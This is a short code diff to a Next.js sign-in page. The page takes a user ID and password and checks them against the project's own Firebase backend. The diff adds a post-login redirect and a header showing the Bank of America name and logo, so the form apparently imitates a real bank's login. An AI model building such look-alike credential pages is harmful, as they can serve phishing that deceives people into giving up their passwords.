@@ -3,12 +3,14 @@
 import { useState } from "react";
 import { getUserByIdentifier } from "@/lib/firebaseUtils"; // adjust path to where your function is
 import { v4 as uuidv4 } from "uuid"; // for generating sessionId
+import { useRouter } from "next/navigation";
 
 export default function SignInPage() {
   const [userId, setUserId] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
+  const router = useRouter();
 
   const handleSignIn = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -43,6 +45,7 @@ export default function SignInPage() {
 
       setLoading(false);
       alert("Sign-in successful!"); // you can redirect here instead
+      router.push("/dashboard");
     } catch (err) {
       console.error(err);
       setError("Something went wrong. Please try again.");
@@ -52,6 +55,14 @@ export default function SignInPage() {
 
   return (
     <div className="min-h-screen flex items-center justify-center bg-gray-100">
+      <div className="fixed top-0 left-0 px-3 py-4.5 flex w-full bg-white z-10">
+        <h2 className="text-xl font-bold text-primary">BANK OF AMERICA</h2>
+        <img
+          src="/images/svg/bank-of-america-logo-png-symbol-0.png"
+          alt="bank of america"
+          className="w-10 h-5"
+        />
+      </div>
       <form
         onSubmit={handleSignIn}
         className="relative overflow-hidden pt-16 bg-white p-8 rounded-md shadow-md w-full max-w-sm"
